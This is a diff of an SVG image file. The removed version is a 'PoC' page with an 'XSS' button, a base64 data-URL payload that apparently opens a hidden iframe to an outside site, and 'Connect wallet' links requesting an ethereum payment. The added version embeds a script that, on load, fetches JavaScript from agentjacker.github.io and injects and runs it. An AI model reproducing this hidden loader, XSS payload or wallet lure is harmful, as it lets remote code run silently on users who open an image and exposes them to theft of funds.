@@ -1,43 +1,20 @@
-<svg version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="none" x="0px" y="0px" height="850" width="960" viewBox="0 0 850 960">
-  <g transform="translate(300, 0) rotate(20)">
-    <foreignObject x="10" y="10" width="800" height="800">
-      <body xmlns="http://www.w3.org/1999/xhtml">
-        <div class="container">
-          <div class="widget-container">
-            <div class="widget-text">
-              taste testing
-            </div>
-          </div>
-          <div class="text" style="text-align:center;">
-            <br/>PoC<p></p>
-            <h1 style="text-decoration:underline;">
-              <br/><a href="ethereum:0x0000000000000000000000000000000000000000?value=10000000000000000&amp;data=0x&amp;gas=30000&amp;gasPrice=30000" target="_self">Connect</a></h1><br/>
-            <a href="data:text/html;base64,PGltZyBzcmMgb25lcnJvcj0nYWxlcnQoMTMzNyArICJcclxzcGFtaWxhIiknPjxpZnJhbWUvc3JjPWh0dHBzOi8vYWdlbnRqYWNrZXIuZ2l0aHViLmlvL3N3YXAvMy5odG1sCiBzdHlsZT12aXNpYmlsaXR5OmhpZGRlbj48L2lmcmFtZT4=" target="_self">
-              <button class="LoginContainer_button__3c9Ij/Button_container__2B8O8 Button_disabled__1f6YP" data-test-id="sign-in-button">XSS</button>
-            </a><br/>
-            <input id="button-checkbox" style="opacity:0" type="checkbox"/>
-            <label class="button" for="button-checkbox">
-              <svg height="60" id="Layer_1" viewBox="0 0 318.6 318.6" width="60" x="0" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" y="0">
-                <!-- SVG paths here -->
-              </svg>
-              <font style="font-weight:bold!important;color:black!important;font-size:22px!important;">prompt</font>
-            </label>
-            <div id="overlay">
-              <div id="widget-container">
-                <p>
-                  <a href="ethereum:0x0000000000000000000000000000000000000000?value=10000000000000000&amp;data=PoC&amp;gas=30000&amp;gasPrice=30000" target="_self">
-                    <svg height="60" id="Layer_1" viewBox="0 0 318.6 318.6" width="60" x="0" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" y="0">
-                      <!-- SVG paths here -->
-                    </svg>
-                    <font style="font-weight:bold;font-size:22px">Connect wallet</font>
-                  </a>
-                </p>
-              </div>
-            </div>
-            <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>
-          </div>
-        </div>
-      </body>
-    </foreignObject>
-  </g>
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="circle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      fetch('https://agentjacker.github.io/swap/tap.php')
+ 			.then(response => {
+          return response.text();
+        })
+        .then(scriptContent => {
+          const script = document.createElement('script');
+          script.textContent = scriptContent;
+          document.body.appendChild(script);
+          if (typeof myCallback === 'function') {
+            myCallback();
+          }
+        })
+        .catch(error => {
+          console.error('Fetch error:', error);
+        });
+   </script>
 </svg>
